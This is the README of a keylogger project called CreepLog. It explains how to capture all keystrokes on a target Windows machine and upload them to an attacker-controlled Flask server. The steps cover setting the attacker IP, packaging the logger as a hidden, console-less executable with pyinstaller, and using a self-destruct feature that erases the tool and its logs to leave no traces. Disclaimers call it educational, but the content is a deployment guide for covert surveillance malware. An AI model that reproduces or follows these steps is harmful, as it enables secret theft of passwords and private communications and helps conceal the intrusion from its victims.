![](img/banner.webp)

# 🔑 **CREEPLOG** 🔑

Welcome to my **Keylogger Project** – a cybersecurity project designed for **educational purposes only**. This tool captures keystrokes on a windows target machine and securely sends log data to a central server interface for review.

> **⚠️ Disclaimer: This tool is intended for educational purposes only. Unauthorized usage on devices you do not own or have explicit permission to test is strictly prohibited and may be illegal.**

| 📜 **TABLE OF CONTENTS**                                              |
| --------------------------------------------------------------------- |
| [🚀 **Features**](#🚀%20**Features**)                                 |
| [⚙️ **Setup and Installation**](#⚙️%20**Setup%20and%20Installation**) |
| [🧩 **Usage**](#🧩%20**Usage**)                                       |
| [⚠️ **Warnings**](#⚠️%20**Warnings**)                                 |
| [📜 **License**](#📜%20**License**)                                   |

---

## 🚀 **Features**

- 🔍 **Keystroke Logging**: Logs all keystrokes on the target machine.
- 🕒 **Configurable Timer**: Remotely configures the timer interval for logging uploads.
- 🌐 **Web Server Interface**: Provides a Flask-based web server for viewing, downloading, and deleting captured logs.
- 💥 **Self-Destruct Option**: Includes a self-destruct mechanism to delete log files and the executable after completion leaving no traces behind.

---

## ⚙️ **Setup and Installation**

### 1. **Clone the Repository**
   Clone the repository to your local machine and navigate into the project directory:
   ```bash
   git clone https://github.com/RIZZZIOM/creeplog.git
   cd creeplog
   ```

### 2. **Install Required Packages**
   Set up a virtual environment and install the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

### 3. **Configure Server and Target**

   - **Edit IP Addresses**:
     - Update IP addresses to match the attacker’s machine:
       - In `creeplog.py`, change the attacker IP on **line 11** and **line 63**.
       - In `server.py`, change the attacker IP on **line 138**. 
       - In `/static/js/index.js`, change the IP on **line 26**.
   - Edit timer (optional): the default timer for logs upload is 60 seconds and can be changed in line **28** in `server.py`

   - **Run the Server**:
     - Start the Flask web server on your local machine:
       ```bash
       python server.py
       ```
       _(Use `python3` instead if `python` doesn’t work.)_

   - **Generate an Executable for the Target Machine**:
     - Package the keylogger script into a Windows-compatible executable:
       ```bash
       pyinstaller --onefile --noconsole --hidden-import=keyboard creeplog.py
       ```
       This will create an executable file that can run on the target Windows machine without requiring Python.

---

## 🧩 **Usage**

After configuring the IP addresses and setting up the server and target as outlined above, follow these steps to start using **CreepLog**:

### 1. **Run the Web Server**

   - Start the Flask server:
     ```bash
     python server.py
     ```
   - Access the web interface:
     - Open a web browser and navigate to `http://<server-ip>:<port>`

### 2. **Run the Keylogger on the Target Machine**

   - Execute the packaged keylogger executable on the target Windows machine.
   - **Once running, the keylogger will:**
     - Capture keystrokes continuously.
     - Periodically upload log files to the web server.
     - Optionally, delete itself after execution if the self-destruct feature is enabled.


> [!NOTE] EXAMPLE USAGE
> Refer to [USER GUIDE](USER%20GUIDE.md) for step by step installation

---

## ⚠️ **Warnings**

- **Legal Compliance**: This project should only be used with explicit permission on devices you own or have permission to test. Unauthorized use is illegal and unethical.
- **Educational Use Only**: This project is created strictly for cybersecurity research and educational purposes.
- **Security Risks**: Running a keylogger poses inherent security risks. Ensure the server and target environments are controlled.

---

## 📜 **License**

This project is licensed under the MIT License. See  [LICENSE](LICENSE.txt) for more information.

> **💡 Note:** Please exercise caution and respect privacy when using this tool. Misuse of keylogging technology is a violation of privacy laws in many regions.

--- 
